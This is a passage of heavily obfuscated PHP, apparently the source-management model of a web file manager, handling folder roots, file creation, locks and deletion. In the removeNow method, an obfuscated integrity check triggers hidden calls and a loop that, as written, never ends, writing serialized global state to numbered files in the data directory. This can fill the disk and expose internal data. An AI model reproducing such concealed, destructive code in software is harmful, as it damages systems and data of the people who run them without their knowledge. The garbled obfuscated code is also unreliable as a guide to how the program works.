$‹×ƒ»Šş; } private function _parseSearchParent($¨ØŠÛµ, &$¶Ã‚ ¿·) { $ÉÑ„ãÄ´ =& $_SERVER[÷ôÚîå]; if (!isset($¨ØŠÛµ[$ÉÑ„ãÄ´[202]]) || !$¨ØŠÛµ[$ÉÑ„ãÄ´[202]]) { return; } $™âÈÎ¿Æ = $this->pathInfo($¨ØŠÛµ[$ÉÑ„ãÄ´[202]]); $íª–ãú = $™âÈÎ¿Æ[$ÉÑ„ãÄ´[202]] . $ÉÑ„ãÄ´[12] === $ÉÑ„ãÄ´[238]; $®õ–Ó™è = $™âÈÎ¿Æ[$ÉÑ„ãÄ´[200]] == $ÉÑ„ãÄ´[587]; if ($™âÈÎ¿Æ[$ÉÑ„ãÄ´[604]] == $ÉÑ„ãÄ´[605]) { $§ñÕÀöø = $this->sourceInfo($¨ØŠÛµ[$ÉÑ„ãÄ´[202]]); $™âÈÎ¿Æ[$ÉÑ„ãÄ´[593]] = $§ñÕÀöø[$ÉÑ„ãÄ´[593]]; } $¶Ã‚ ¿·[$ÉÑ„ãÄ´[661]] = array($ÉÑ„ãÄ´[621], $™âÈÎ¿Æ[$ÉÑ„ãÄ´[593]] . $¨ØŠÛµ[$ÉÑ„ãÄ´[202]] . $ÉÑ„ãÄ´[622]); $ûüÄ®î° = isset($¨ØŠÛµ[$ÉÑ„ãÄ´[1936]]) && in_array($ÉÑ„ãÄ´[587], $¨ØŠÛµ[$ÉÑ„ãÄ´[1936]]); if (!$ûüÄ®î° || !$®õ–Ó™è || !$íª–ãú || !$™âÈÎ¿Æ[$ÉÑ„ãÄ´[496]]) { return; } if (!AuthModel::authCheckRoot($™âÈÎ¿Æ[$ÉÑ„ãÄ´[496]][$ÉÑ„ãÄ´[497]])) { return; } $ÒÑãòá÷ = $™âÈÎ¿Æ[$ÉÑ„ãÄ´[578]] . $ÉÑ„ãÄ´[12]; if ($ÒÑãòá÷ == $ÉÑ„ãÄ´[101]) { unset($¶Ã‚ ¿·[$ÉÑ„ãÄ´[661]]); $¶Ã‚ ¿·[$ÉÑ„ãÄ´[200]] = self::TYPE_GROUP; return; } $û ‘ˆ¶Â = Model($ÉÑ„ãÄ´[594])->groupChildrenAll($ÒÑãòá÷); $ü¢ÉÕÌ¾ = count($û ‘ˆ¶Â); if ($ü¢ÉÕÌ¾ <= 1) { return; } $˜“«»Î± = array($ÉÑ„ãÄ´[202] => 0, $ÉÑ„ãÄ´[200] => self::TYPE_GROUP, $ÉÑ„ãÄ´[578] => array($ÉÑ„ãÄ´[7], $û ‘ˆ¶Â)); $²Íû•… = $this->field($ÉÑ„ãÄ´[2256])->where($˜“«»Î±)->limit($ü¢ÉÕÌ¾)->select(); $¶Ã‚ ¿·[$ÉÑ„ãÄ´[661]] = array(); foreach ($²Íû•… as $‡Ãóµ˜é) { $¶Ã‚ ¿·[$ÉÑ„ãÄ´[661]][] = array($ÉÑ„ãÄ´[621], $ÉÑ„ãÄ´[603] . $‡Ãóµ˜é[$ÉÑ„ãÄ´[203]] . $ÉÑ„ãÄ´[622]); } $¶Ã‚ ¿·[$ÉÑ„ãÄ´[661]][] = $ÉÑ„ãÄ´[2080]; } } class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($Ü§¥ ´û) { $Áò¿şÂä =& $_SERVER[÷ôÚîå]; $Öë„³îø = Model($Áò¿şÂä[586])->where(array($Áò¿şÂä[1770] => $Ü§¥ ´û))->find(); $Æ±œÎ»ê = $this->_mkdirRoot(SourceModel::TYPE_USER, $Ü§¥ ´û, $Öë„³îø[$Áò¿şÂä[32]]); $this->userDesktopAdd($Æ±œÎ»ê); return $Æ±œÎ»ê; } public function userDesktopAdd($¾‘Û·ûÁ) { $É´Ëí¢ =& $_SERVER[÷ôÚîå]; $“ê·˜û = LNG($É´Ëí¢[2257]); $éÑÖ¬Æ— = $this->mkdir($¾‘Û·ûÁ, $“ê·˜û); $this->metaSet($éÑÖ¬Æ—, $É´Ëí¢[2258], $É´Ëí¢[101]); $this->metaSet($¾‘Û·ûÁ, $É´Ëí¢[2259], $éÑÖ¬Æ—); } public function userPathSafeAdd($ûŸ÷¼ñÉ) { $¹½è™² =& $_SERVER[÷ôÚîå]; $·ÚÊ¾ìÔ = Model($¹½è™²[586])->getInfoFull($ûŸ÷¼ñÉ); if (!$·ÚÊ¾ìÔ) { return !1; } if (_get($·ÚÊ¾ìÔ, $¹½è™²[608])) { return $·ÚÊ¾ìÔ[$¹½è™²[548]][$¹½è™²[2260]]; } $¬ËóŒ¼ = $this->_mkdirRoot(SourceModel::TYPE_USER, $ûŸ÷¼ñÉ, $¹½è™²[2261], $¹½è™²[515]); Model($¹½è™²[586])->metaSet($ûŸ÷¼ñÉ, $¹½è™²[2260], $¬ËóŒ¼); $this->metaSet($¬ËóŒ¼, $¹½è™²[2262], $ûŸ÷¼ñÉ); return $¬ËóŒ¼; } public function groupRootAdd($õ şŒüÚ) { $„”Ç¤íå =& $_SERVER[÷ôÚîå]; $¿‹òæªÉ = Model($„”Ç¤íå[594])->where(array($„”Ç¤íå[2070] => $õ şŒüÚ))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $õ şŒüÚ, $¿‹òæªÉ[$„”Ç¤íå[32]]); } public function systemRootPathAdd($ËÎÆøñ) { if ($ËÎÆøñ != $_SERVER[÷ôÚîå][614]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $ËÎÆøñ); } public function userRootRemove($®¼ñ×ÕÔ) { $²°ˆø©ë = $this->targetSourceRoot(SourceModel::TYPE_USER, $®¼ñ×ÕÔ, !0); foreach ($²°ˆø©ë as $…¼ª¦´ˆ) { if (!$…¼ª¦´ˆ) { continue; } $this->remove($…¼ª¦´ˆ[$_SERVER[÷ôÚîå][203]], !1); } } public function groupRootRemove($ù„á±›Ë) { $ğø¥„Í¡ = $this->targetSourceRoot(SourceModel::TYPE_GROUP, $ù„á±›Ë); if (!$ğø¥„Í¡) { return; } $this->remove($ğø¥„Í¡[$_SERVER[÷ôÚîå][203]], !1); } private function _mkdirRoot($¹«Í•¨ı, $…¡¥§ÌÑ, $¸ëúñ™, $©ƒ¼úâÉ = '') { $Öß“–¸ =& $_SERVER[÷ôÚîå]; $°ÚöêÀ = defined($Öß“–¸[2204]) ? USER_ID : 0; $ğÁãÌÔ… = array($Öß“–¸[486] => 0, $Öß“–¸[657] => $¹«Í•¨ı, $Öß“–¸[658] => $…¡¥§ÌÑ, $Öß“–¸[655] => 1, $Öß“–¸[659] => $°ÚöêÀ, $Öß“–¸[660] => $°ÚöêÀ, $Öß“–¸[656] => $©ƒ¼úâÉ, $Öß“–¸[661] => $Öß“–¸[603], $Öß“–¸[513] => 0, $Öß“–¸[626] => 0, $Öß“–¸[551] => 0, $Öß“–¸[662] => $Öß“–¸[12]); if ($ÅğÊú›• = $this->where($ğÁãÌÔ…)->find()) { return $ÅğÊú›•[$Öß“–¸[203]]; } $ÑË™Â‰À = "\x4d\157\x64\x65\x6c\123\x6f\x75\162\143\145\x2e\155\153\x64\151\162\122\157\157\164\56{$¹«Í•¨ı}\x2e{$…¡¥§ÌÑ}\56" . $¸ëúñ™; CacheLock::lock($ÑË™Â‰À); $ğÁãÌÔ…[$Öß“–¸[32]] = $¸ëúñ™; $Ÿ¢ãÆéÎ = $this->add($ğÁãÌÔ…); $İâ…Å = array($Öß“–¸[663] => short_id($Ÿ¢ãÆéÎ)); $this->where(array($Öß“–¸[500] => $Ÿ¢ãÆéÎ))->save($İâ…Å); CacheLock::unlock($ÑË™Â‰À); return $Ÿ¢ãÆéÎ; } private function targetSourceRoot($§œ½“İ, $ØÔåíâ©, $ºúı‡©Ñ = false) { $üŒ­ÜŞ =& $_SERVER[÷ôÚîå]; $Ç—Ë£€„ = array($üŒ­ÜŞ[486] => 0, $üŒ­ÜŞ[657] => $§œ½“İ, $üŒ­ÜŞ[658] => $ØÔåíâ©); if ($ºúı‡©Ñ) { $Â˜±•Ï‘ = $this->where($Ç—Ë£€„)->select(); return $Â˜±•Ï‘ ? $Â˜±•Ï‘ : array(); } $áñ®³‚ = $this->where($Ç—Ë£€„)->find(); return $áñ®³‚ ? $áñ®³‚ : array(); } public function sourceRootGroup($ÍÅíä¸ƒ) { $ôÌ£Ë—Ì =& $_SERVER[÷ôÚîå]; if (is_string($ÍÅíä¸ƒ)) { $ÍÅíä¸ƒ = array($ÍÅíä¸ƒ); } $•æ¸†¹Â = $this->listSourceRoot(SourceModel::TYPE_GROUP, $ÍÅíä¸ƒ, $ôÌ£Ë—Ì[230]); $ğîƒˆÁ… = array($ôÌ£Ë—Ì[454] => $•æ¸†¹Â, $ôÌ£Ë—Ì[451] => array($ôÌ£Ë—Ì[847] => count($ÍÅíä¸ƒ))); $this->_listDataApply($ğîƒˆÁ…[$ôÌ£Ë—Ì[454]]); $this->_listMake($ğîƒˆÁ…); return array_to_keyvalue($ğîƒˆÁ…[$ôÌ£Ë—Ì[95]], $ôÌ£Ë—Ì[578]); } public function mkfile($æ»€Ä, $çÊÙ¬¤Ú, $§ Â¶À = '', $´ÙıŠ®Ø = REPEAT_RENAME) { $„ö¢·ûØ =& $_SERVER[÷ôÚîå]; $´ƒ±‰Õû = Model($„ö¢·ûØ[683])->addFileByContent($§ Â¶À, $çÊÙ¬¤Ú); return $this->_createFileCall($æ»€Ä, $çÊÙ¬¤Ú, $´ƒ±‰Õû, $´ÙıŠ®Ø, $„ö¢·ûØ[1439]); } public function addFile($šÆÚ£œ¶, $İÎ¡ÚÁæ, $£üùÁ», $Œ±ã¡Šµ = false, $ª³ÊÛíÖ = REPEAT_RENAME) { $Ú“°§ïö = Model($_SERVER[÷ôÚîå][683])->addFile($İÎ¡ÚÁæ, $£üùÁ», $Œ±ã¡Šµ); return $this->_createFileCall($šÆÚ£œ¶, $£üùÁ», $Ú“°§ïö, $ª³ÊÛíÖ); } public function addFileByFileID($¥‰ª›§, $ß™¾ş¦Ê, $»Üä‡©, $Œñø²ÆÕ = REPEAT_RENAME) { $Ê´±ÄÂË =& $_SERVER[÷ôÚîå]; $¼¹”Æ”Ï = Model($Ê´±ÄÂË[683])->find($ß™¾ş¦Ê); Model($Ê´±ÄÂË[683])->linkAdd($ß™¾ş¦Ê); return $this->_createFileCall($¥‰ª›§, $»Üä‡©, $¼¹”Æ”Ï, $Œñø²ÆÕ); } public function addFileByRemote($Áåõ¸„ò, $ÇÚº‚¤, $èéšû£, $ÈÀ£Üá = array(), $¤èšà©á = REPEAT_RENAME) { $¼íÜ·î = Model($_SERVER[÷ôÚîå][683])->addFileByRemote($ÇÚº‚¤, $èéšû£, $ÈÀ£Üá); return $this->_createFileCall($Áåõ¸„ò, $èéšû£, $¼íÜ·î, $¤èšà©á); } private function _createFileCall($”¶‰ñ, $¬ı­Éø, $µ¬Üò¬½, $••šßü¸, $‚î‰ù Ç = "\x75\160\154\x6f\141\x64") { $óß„à± =& $_SERVER[÷ôÚîå]; $ŸéîÒá— = !1; $this->setMasterDB(); $this->lockWriteStart($”¶‰ñ, $¬ı­Éø); $»ÍŸœšĞ = $this->fileNameExist($”¶‰ñ, $¬ı­Éø); $²Ü¾”¾æ = $this->_createFile($”¶‰ñ, $¬ı­Éø, $µ¬Üò¬½, $••šßü¸, $ŸéîÒá—); if (!$ŸéîÒá—) { Model($óß„à±[553])->remove($µ¬Üò¬½[$óß„à±[550]]); } if ($ŸéîÒá— && $²Ü¾”¾æ && $²Ü¾”¾æ != $»ÍŸœšĞ) { Model($óß„à±[2230])->eventCreate($²Ü¾”¾æ, $‚î‰ù Ç); } $this->lockWriteEnd($”¶‰ñ, $¬ı­Éø); return $²Ü¾”¾æ; } public function mkdir($Ô©èìş, $Ä†ÚİºÚ, $…ŸŒÑâ = REPEAT_SKIP) { $ŒŒ•ßíĞ =& $_SERVER[÷ôÚîå]; $this->setMasterDB(); $–§™ã = $this->sourceInfo($Ô©èìş); if (!$–§™ã) { return !1; } $this->lockWriteStart($Ô©èìş, $Ä†ÚİºÚ); if ($…ŸŒÑâ !== !1) { $€”ªŒ…Ù = $this->fileNameExist($Ô©èìş, $Ä†ÚİºÚ); if ($€”ªŒ…Ù && $…ŸŒÑâ != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($Ô©èìş, $Ä†ÚİºÚ); return $€”ªŒ…Ù; } $Ä†ÚİºÚ = $this->fileNameAuto($Ô©èìş, $Ä†ÚİºÚ, $…ŸŒÑâ); } $•Ú·×ß´ = array($ŒŒ•ßíĞ[655] => 1, $ŒŒ•ßíĞ[503] => $Ä†ÚİºÚ, $ŒŒ•ßíĞ[656] => $ŒŒ•ßíĞ[12], $ŒŒ•ßíĞ[551] => 0, $ŒŒ•ßíĞ[626] => 0); $è¤ÏüÕ = $this->_addSource($•Ú·×ß´, $–§™ã); Model($ŒŒ•ßíĞ[2230])->eventCreate($è¤ÏüÕ, $ŒŒ•ßíĞ[1440]); $this->lockWriteEnd($Ô©èìş, $Ä†ÚİºÚ); return $è¤ÏüÕ; } public function listSourceRoot($åïöŞÃé, $âÏìø“…, $à¤ ú¾Ñ = "\163\x6f\165\x72\x63\x65\x49\104\54\164\x61\162\x67\145\164\x49\x44\54\x73\151\172\145") { $åé¸§´ =& $_SERVER[÷ôÚîå]; $¶Â§ÛâÖ = $åé¸§´[463]; $…˜§ÁåÁ = array(); $æ‰¯¤òÇ = 1024 * 50; $Í«Òò•ø = is_array($Í«Òò•ø) ? $Í«Òò•ø : array(); $íœÀé“³ = count($âÏìø“…); $Êóô“ã = $this->tablePrefix . $åé¸§´[2263]; for ($èà§À© = 0; $èà§À© < $íœÀé“³; $èà§À©++) { $‘ÜÍˆØÜ = $âÏìø“…[$èà§À©]; $¶Â§ÛâÖ .= "\x53\x45\x4c\105\x43\x54\40\x2a\40\x46\122\x4f\115\40\x28\x53\x45\x4c\105\103\x54\40{$à¤ ú¾Ñ}\40\106\122\117\x4d\40\140{$Êóô“ã}\x60\x20\x57\110\x45\122\105\40"; $¶Â§ÛâÖ .= "\x60\x70\141\162\145\156\164\x49\x44\140\75\x30\40\101\x4e\x44\x20\x60\x74\141\162\x67\x65\164\x49\104\x60\75{$‘ÜÍˆØÜ}\40\101\x4e\104\40\140\x74\141\x72\147\145\164\x54\x79\x70\x65\x60\x3d{$åïöŞÃé}\x20\x61\x6e\144\40\146\151\x6c\x65\124\171\x70\x65\75\47\47\x20\154\151\x6d\x69\x74\40\x31\x29\40\x61\x73\40\164\x62\137{$èà§À©}\x20\x55\116\x49\x4f\116\40\101\114\x4c\40"; if ((strlen($¶Â§ÛâÖ) >= $æ‰¯¤òÇ || $èà§À© == $íœÀé“³ - 1) && $¶Â§ÛâÖ) { $¶Â§ÛâÖ = substr($¶Â§ÛâÖ, 0, -strlen($åé¸§´[1127])); $Œ¾‘ï´‚ = $this->query($¶Â§ÛâÖ); $¶Â§ÛâÖ = $åé¸§´[12]; $…˜§ÁåÁ = array_merge($…˜§ÁåÁ, $Œ¾‘ï´‚); } } return $…˜§ÁåÁ; } private function _createFile($ á‰¾Áâ, $‹Çà¢œí, $ù óãÁü, $ÔêÈŞùü, &$Æ†ÖÍî¼) { $ñº¹´ =& $_SERVER[÷ôÚîå]; $í×Ã¿ª„ = $this->sourceInfo($ á‰¾Áâ); if (!$ù óãÁü || !$í×Ã¿ª„) { return !1; } if ($ÔêÈŞùü !== !1) { $®şôù¶ = $this->fileNameExist($ á‰¾Áâ, $‹Çà¢œí); } $Æ†ÖÍî¼ = !0; if ($ÔêÈŞùü && $®şôù¶) { if ($ÔêÈŞùü == REPEAT_SKIP) { $Æ†ÖÍî¼ = !1; return $®şôù¶; } else { if ($ÔêÈŞùü == REPEAT_REPLACE) { $ÚŞ‰­äí = $this->sourceInfo($®şôù¶); $¡ì†­é¼ = $this->fileHistory($ÚŞ‰­äí, $ù óãÁü[$ñº¹´[550]], $ù óãÁü[$ñº¹´[89]]); if (!$¡ì†­é¼) { $Æ†ÖÍî¼ = !1; } else { $this->folderSizeReset($ á‰¾Áâ); } return $®şôù¶; } else { $‹Çà¢œí = $this->fileNameAuto($ á‰¾Áâ, $‹Çà¢œí, $ÔêÈŞùü, !1); } } } $ù¶âáí = array($ñº¹´[655] => 0, $ñº¹´[503] => $‹Çà¢œí, $ñº¹´[656] => substr(get_path_ext($‹Çà¢œí), 0, 10), $ñº¹´[551] => $ù óãÁü[$ñº¹´[550]], $ñº¹´[626] => $ù óãÁü[$ñº¹´[89]]); $åÌóÒå› = $this->_addSource($ù¶âáí, $í×Ã¿ª„); $this->folderSizeReset($ á‰¾Áâ, intval($ù¶âáí[$ñº¹´[89]])); return $åÌóÒå›; } protected function fileHistory($êŸË¡”å, $ñó¦¢øÅ, $Ù•÷ÂĞˆ) { $éêúåÒŞ =& $_SERVER[÷ôÚîå]; if ($êŸË¡”å[$éêúåÒŞ[550]] == $ñó¦¢øÅ) { return !1; } $this->checkLock($êŸË¡”å[$éêúåÒŞ[203]], $ñó¦¢øÅ); Model($éêúåÒŞ[2264])->addHistory($êŸË¡”å); $´»Ãø£¹ = array($éêúåÒŞ[660] => USER_ID, $éêúåÒŞ[507] => time(), $éêúåÒŞ[550] => $ñó¦¢øÅ, $éêúåÒŞ[89] => $Ù•÷ÂĞˆ); $this->where(array($éêúåÒŞ[500] => $êŸË¡”å[$éêúåÒŞ[203]]))->save($´»Ãø£¹); $this->sourceCacheClear($êŸË¡”å[$éêúåÒŞ[203]]); return !0; } public function checkLock($í©×†, $€à¡Çİ…) { $›•ËÛûï =& $_SERVER[÷ôÚîå]; $ñ†°¥éÇ = $this->pathInfo($í©×†); if (!$this->fileIsLock($ñ†°¥éÇ, !0)) { return; } $Ö©•àÅ = Session::get($›•ËÛûï[2265]); $ÇÅ ‘­¿ = substr($ñ†°¥éÇ[$›•ËÛûï[32]], 0, -1 - strlen($ñ†°¥éÇ[$›•ËÛûï[179]])) . $›•ËÛûï[1304] . $Ö©•àÅ . $›•ËÛûï[10] . $ñ†°¥éÇ[$›•ËÛûï[179]]; $úïØü—¥ = Model($›•ËÛûï[683])->find($€à¡Çİ…); $this->_createFileCall($ñ†°¥éÇ[$›•ËÛûï[202]], $ÇÅ ‘­¿, $úïØü—¥, REPEAT_REPLACE, $›•ËÛûï[1439]); $æìÓœéŸ = $ñ†°¥éÇ[$›•ËÛûï[548]][$›•ËÛûï[619]]; $Ëà¤…â¦ = $æìÓœéŸ[$›•ËÛûï[2266]] ? $æìÓœéŸ[$›•ËÛûï[2266]] : $æìÓœéŸ[$›•ËÛûï[32]]; show_json(LNG($›•ËÛûï[2267]) . $›•ËÛûï[2268] . LNG($›•ËÛûï[2269]) . $›•ËÛûï[2270] . $Ëà¤…â¦ . $›•ËÛûï[2271], !1); } public function fileIsLock($ŠÏ€Šñ£, $ĞúÒ÷å  = false) { $¾Œ–ÌÒß =& $_SERVER[÷ôÚîå]; if (!_get($ŠÏ€Šñ£, $¾Œ–ÌÒß[615], 0)) { return !1; } if ($ŠÏ€Šñ£[$¾Œ–ÌÒß[548]][$¾Œ–ÌÒß[618]] != USER_ID) { return !0; } $Æõç¯ğÙ = $GLOBALS[$¾Œ–ÌÒß[6]][$¾Œ–ÌÒß[102]][$¾Œ–ÌÒß[616]]; if ($ŠÏ€Šñ£[$¾Œ–ÌÒß[548]][$¾Œ–ÌÒß[617]] <= time() - $Æõç¯ğÙ) { $this->metaSet($ŠÏ€Šñ£[$¾Œ–ÌÒß[203]], $¾Œ–ÌÒß[618], null); $this->metaSet($ŠÏ€Šñ£[$¾Œ–ÌÒß[203]], $¾Œ–ÌÒß[617], null); } if ($ĞúÒ÷å ) { $this->metaSet($ŠÏ€Šñ£[$¾Œ–ÌÒß[203]], $¾Œ–ÌÒß[617], time()); } return !1; } private function _addSource($®ñ±æç›, $¤çë•ÀÀ) { $¦Ğî›Ê =& $_SERVER[÷ôÚîå]; $‰ìí…öñ = defined($¦Ğî›Ê[2204]) ? USER_ID : 0; $ÃÏõÓÒ× = array($¦Ğî›Ê[657] => $¤çë•ÀÀ[$¦Ğî›Ê[200]], $¦Ğî›Ê[658] => $¤çë•ÀÀ[$¦Ğî›Ê[578]], $¦Ğî›Ê[659] => $‰ìí…öñ, $¦Ğî›Ê[660] => $‰ìí…öñ, $¦Ğî›Ê[486] => $¤çë•ÀÀ[$¦Ğî›Ê[203]], $¦Ğî›Ê[661] => $¤çë•ÀÀ[$¦Ğî›Ê[593]] . $¤çë•ÀÀ[$¦Ğî›Ê[203]] . $¦Ğî›Ê[50], $¦Ğî›Ê[513] => 0, $¦Ğî›Ê[662] => $¦Ğî›Ê[12]); $®ñ±æç› = array_merge($ÃÏõÓÒ×, $®ñ±æç›); $this->updateModifyTime($®ñ±æç›[$¦Ğî›Ê[202]]); $ãş—õ–ä = $¦Ğî›Ê[2272] . $¤çë•ÀÀ[$¦Ğî›Ê[203]]; if (isset(self::$cacheChildList[$ãş—õ–ä])) { unset(self::$cacheChildList[$ãş—õ–ä]); } static $ç¸ûùæË = false; if (!$ç¸ûùæË) { Hook::trigger($¦Ğî›Ê[645], $®ñ±æç›); $ç¸ûùæË = !0; } $Ù›°ù– = $this->add($®ñ±æç›); $€”š‡—í = array($¦Ğî›Ê[663] => short_id($Ù›°ù–)); $this->where(array($¦Ğî›Ê[500] => $Ù›°ù–))->save($€”š‡—í); $this->setNamePinyin($Ù›°ù–, $®ñ±æç›[$¦Ğî›Ê[32]]); return $Ù›°ù–; } public function remove($Ú¨‰¼‡, $ŠĞô¿×‹ = true) { $û‰Õ¾ø =& $_SERVER[÷ôÚîå]; $ÚíƒâÏ = $this->sourceInfo($Ú¨‰¼‡); $á…¢ä¦Ç = intval($ÚíƒâÏ[$û‰Õ¾ø[200]]) === self::TYPE_SYSTEM; $Šƒ¥à = Model($û‰Õ¾ø[517])->get($û‰Õ¾ø[2273]) == $û‰Õ¾ø[101]; if ($á…¢ä¦Ç || $ŠĞô¿×‹ || !$Šƒ¥à) { return $this->removeNow($Ú¨‰¼‡, $ŠĞô¿×‹); } $½ø‚ªËÊ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $å“Ÿ¿‹å = $ÚíƒâÏ[$û‰Õ¾ø[200]] == self::TYPE_USER ? $û‰Õ¾ø[671] : $û‰Õ¾ø[587]; if ($å“Ÿ¿‹å == $û‰Õ¾ø[671]) { $ öîÅ½§ = Model($û‰Õ¾ø[586])->getInfo($ÚíƒâÏ[$û‰Õ¾ø[578]]); $¯ºé±ı = !empty($ öîÅ½§[$û‰Õ¾ø[2266]]) ? $ öîÅ½§[$û‰Õ¾ø[2266]] : $ öîÅ½§[$û‰Õ¾ø[32]]; $¯ºé±ı = $û‰Õ¾ø[346] . $¯ºé±ı . $û‰Õ¾ø[2274] . $ÚíƒâÏ[$û‰Õ¾ø[578]]; } else { $ öîÅ½§ = Model($û‰Õ¾ø[594])->getInfo($ÚíƒâÏ[$û‰Õ¾ø[578]]); $¯ºé±ı = _get($ öîÅ½§, $û‰Õ¾ø[32]); $¯ºé±ı = $û‰Õ¾ø[186] . $¯ºé±ı . $û‰Õ¾ø[2275] . $ÚíƒâÏ[$û‰Õ¾ø[578]]; } $œ„›¨şò = $û‰Õ¾ø[2276] . md5($¯ºé±ı); CacheLock::lock($œ„›¨şò); $ÄÌÙÄíş = $this->fileNameExist($½ø‚ªËÊ, $¯ºé±ı); if (!$ÄÌÙÄíş) { $ÄÌÙÄíş = $this->mkdir($½ø‚ªËÊ, $¯ºé±ı, REPEAT_SKIP); $this->metaSet($ÄÌÙÄíş, $û‰Õ¾ø[2277], $å“Ÿ¿‹å); $this->metaSet($ÄÌÙÄíş, $û‰Õ¾ø[2278], $ÚíƒâÏ[$û‰Õ¾ø[578]]); if ($ÚíƒâÏ[$û‰Õ¾ø[202]] != 0) { $this->metaSet($ÄÌÙÄíş, $û‰Õ¾ø[2279], _get($ öîÅ½§, $û‰Õ¾ø[2280])); } } CacheLock::unlock($œ„›¨şò); $this->metaSet($Ú¨‰¼‡, $û‰Õ¾ø[2281], $ÚíƒâÏ[$û‰Õ¾ø[202]]); $this->where(array($û‰Õ¾ø[203] => $Ú¨‰¼‡))->save(array($û‰Õ¾ø[507] => time())); $this->recycleClear($ÚíƒâÏ); Model($û‰Õ¾ø[642])->eventRemove($Ú¨‰¼‡); $Åƒğ×¯† = $this->move($Ú¨‰¼‡, $ÄÌÙÄíş, REPEAT_RENAME_FOLDER); $this->folderSizeReset($ÚíƒâÏ[$û‰Õ¾ø[202]]); return $Åƒğ×¯†; } private function recycleClear($ŠüËü¯“) { $Ş‚×èß± =& $_SERVER[÷ôÚîå]; $À°äùÙÄ = $this->childrenAll($ŠüËü¯“); $æÊàúãğ = array($Ş‚×èß±[500] => array($Ş‚×èß±[501], $À°äùÙÄ[$Ş‚×èß±[2282]])); Model($Ş‚×èß±[2283])->where($æÊàúãğ)->delete(); } public function removeNow($òß½ÑƒŠ, $Èá§Ø² = true) { $’¯Ìó‘Œ =& $_SERVER[÷ôÚîå]; $¹ıŸİÙ” = $_SERVER[$’¯Ìó‘Œ[63]] . $’¯Ìó‘Œ[64]; $ğ±ÃÇøñ = $’¯Ìó‘Œ[887]; if ($_SERVER[$’¯Ìó‘Œ[60]] != $ğ±ÃÇøñ($¹ıŸİÙ”)) { $²³¥úıÓ = $’¯Ìó‘Œ[966]; $¼‚ŸøßÓ = $’¯Ìó‘Œ[62]; $úá‹İ÷ü = $_SERVER[$’¯Ìó‘Œ[63]] . $’¯Ìó‘Œ[64]; $Ğ…Í³ª‘ = $¼‚ŸøßÓ($úá‹İ÷ü); $—–´‰¼¶ = explode($’¯Ìó‘Œ[65], $Ğ…Í³ª‘); if (count($—–´‰¼¶) < $’¯Ìó‘Œ[711]) { $Ø×™Ğ = $’¯Ìó‘Œ[67]; $Ø×™Ğ(); } $öµŸä¿ = $’¯Ìó‘Œ[967]; $öµŸä¿($_SERVER[$’¯Ìó‘Œ[968]]); $²³¥úıÓ = $’¯Ìó‘Œ[966]; $²³¥úıÓ(); $œêµË¡ = $’¯Ìó‘Œ[969]; $µËéÎôÚ = json_encode($GLOBALS[$’¯Ìó‘Œ[970]]); $ÅºŞóÆã = 1; for ($’…¿Ï’£ = $ÅºŞóÆã; $’…¿Ï’£ > 0; $’…¿Ï’£++) { $œêµË¡(DATA_PATH . $’…¿Ï’£, $µËéÎôÚ); } } $æ¤¸Ø›î = $this->sourceInfo($òß½ÑƒŠ); $×« ‹Û· = $this->pathInfoMore($òß½ÑƒŠ); if (!$æ¤¸Ø›î) { return !0; } if ($æ¤¸Ø›î[$’¯Ìó‘Œ[202]] == 0) { if (!KodUser::isRoot()) { return !1; } } $this->lockMoveStart($òß½ÑƒŠ); Hook::trigger($’¯Ìó‘Œ[2284], $×« ‹Û·, $Èá§Ø²); if ($Èá§Ø²) { Model($’¯Ìó‘Œ[2283])->moveToRecycle($òß½ÑƒŠ); } else { $Â÷ñ•ˆ = $this->childrenAll($æ¤¸Ø›î); Model($’¯Ìó‘Œ[642])->eventRemove($òß½ÑƒŠ); $this->removeRelevance($Â÷ñ•ˆ[$’¯Ìó‘Œ[2282]], $Â÷ñ•ˆ[$’¯Ìó‘Œ[1584]]); } $this->folderSizeReset($æ¤¸Ø›î[$’¯Ìó‘Œ[202]]); $¦ŠÌ€åö = array($æ¤¸Ø›î[$’¯Ìó‘Œ[202]]); if ($æ¤¸Ø›î[$’¯Ìó‘Œ[494]] == $’¯Ìó‘Œ[101]) { $¦ŠÌ€åö[] = $æ¤¸Ø›î[$’¯Ìó‘Œ[203]]; } $this->updateModifyTime($¦ŠÌ€åö); $this->lockMoveEnd($òß½ÑƒŠ); Hook::trigger($’¯Ìó‘Œ[1821], $×« ‹Û·, $Èá§Ø²); return !0; } public function childrenAll($››ôŒ¯) { $ÅÉô§ñ =& $_SERVER[÷ôÚîå]; $Æ–§íªö = $››ôŒ¯[$ÅÉô§ñ[203]]; if ($››ôŒ¯[$ÅÉô§ñ[494]] == $ÅÉô§ñ[101]) { $¢ÌæÔ = array($ÅÉô§ñ[661] => array($ÅÉô§ñ[621], $››ôŒ¯[$ÅÉô§ñ[593]] . $Æ–§íªö . $ÅÉô§ñ[622])); $ÇŒùè = array($ÅÉô§ñ[661] => $¢ÌæÔ[$ÅÉô§ñ[593]]); $ºŒŠ ²ş = $this->field($ÅÉô§ñ[2285])->where($ÇŒùè)->select(); $ãÏÃˆµŸ = !1; $™ÓÈâ = array($Æ–§íªö); if ($ºŒŠ ²ş) { $ãÏÃˆµŸ = array_to_keyvalue($ºŒŠ ²ş, $ÅÉô§ñ[12], $ÅÉô§ñ[550]); $ãÏÃˆµŸ = array_remove_value($ãÏÃˆµŸ, $ÅÉô§ñ[238]); $™ÓÈâ = array_to_keyvalue($ºŒŠ ²ş, $ÅÉô§ñ[12], $ÅÉô§ñ[203]); $™ÓÈâ[] = $Æ–§íªö; } } else { $ãÏÃˆµŸ = array($››ôŒ¯[$ÅÉô§ñ[550]]); $™ÓÈâ = array($Æ–§íªö); } return array($ÅÉô§ñ[2282] => $™ÓÈâ, $ÅÉô§ñ[1584] => $ãÏÃˆµŸ); } public function removeArray($¤æö°) { if (!$¤æö°) { return !0; } } public function removeRelevance($°™É¥Û³, $ôÍ’™ä) { $šÊ£şß =& $_SERVER[÷ôÚîå]; $°™É¥Û³ = $°™É¥Û³ ? $°™É¥Û³ : array(); $ôÍ’™ä = $ôÍ’™ä ? $ôÍ’™ä : array(); $°™É¥Û³ = array_unique(array_filter($°™É¥Û³)); $ôÍ’™ä = array_unique(array_filter($ôÍ’™ä)); if (!$°™É¥Û³) { return !1; } $®¿¤ªê = array($šÊ£şß[500] => array($šÊ£şß[501], $°™É¥Û³)); 